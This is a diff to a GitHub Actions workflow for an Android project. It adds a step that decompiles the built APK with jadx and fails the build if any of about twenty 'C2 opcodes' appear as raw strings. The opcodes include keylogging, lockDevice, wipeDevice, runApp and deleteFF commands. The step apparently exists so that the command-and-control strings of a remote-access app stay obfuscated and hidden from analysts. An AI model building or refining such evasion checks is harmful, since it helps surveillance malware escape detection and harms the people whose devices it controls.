@@ -222,6 +222,63 @@ jobs:
             exit 1
           fi
 
+      - name: Install jadx and verify no raw C2 opcodes in decompiled APK
+        shell: bash
+        run: |
+          # Install jadx via apt (available on ubuntu-latest runners)
+          # If unavailable, we skip the check gracefully — the fallback jar is
+          # not used because PATH changes don't persist across shell invocations
+          command -v jadx >/dev/null 2>&1 || { sudo apt-get update -qq && sudo apt-get install -y -qq jadx; }
+
+          if ! command -v jadx >/dev/null 2>&1; then
+            echo "⚠️  jadx not available, skipping source-leak verification"
+            exit 0
+          fi
+
+          DECOMP_DIR=/tmp/decompiled-apk
+          mkdir -p "$DECOMP_DIR"
+
+          echo "::group::Decompiling APK with jadx..."
+          jadx -d "$DECOMP_DIR" -q app/build/outputs/apk/debug/app-debug.apk 2>&1 || \
+            echo "(jadx may have warnings — checking output anyway)"
+          echo "::endgroup::"
+
+          echo "::group::Verifying no raw C2 opcodes in decompiled sources..."
+          if [ -d "$DECOMP_DIR/sources" ]; then
+            VIOLATIONS=0
+
+            for opcode in x0000ca x0000sm x0000fm x0000cl x0000cn x0000mc \
+                          x0000apps x0000lm x0000runApp x0000openUrl x0000deleteFF \
+                          x0000dm x0000lockDevice x0000wipeDevice x0000rebootDevice \
+                          x0000sc x0000kl x0000kldata x0000nt; do
+              FOUND=$(grep -r "\"$opcode\"" "$DECOMP_DIR/sources" \
+                --include="*.java" \
+                --exclude="*ObfuscationUtils*" \
+                --exclude-dir="android" \
+                --exclude-dir="androidx" \
+                --exclude-dir="okhttp" \
+                --exclude-dir="okio" \
+                --exclude-dir="socket" \
+                2>/dev/null || true)
+              if [ -n "$FOUND" ]; then
+                echo "❌ VIOLATION: Raw '$opcode' found in:"
+                echo "$FOUND"
+                VIOLATIONS=$((VIOLATIONS + 1))
+              fi
+            done
+
+            echo ""
+            if [ "$VIOLATIONS" -eq 0 ]; then
+              echo "✅ PASS: No raw C2 opcodes found in decompiled APK"
+            else
+              echo "❌ FAIL: $VIOLATIONS opcode(s) appear as raw strings in decompiled code"
+              exit 1
+            fi
+          else
+            echo "⚠️  jadx output not found, skipping source-leak check"
+          fi
+          echo "::endgroup::"
+
       - name: Upload debug APK
         uses: actions/upload-artifact@v4
         with:
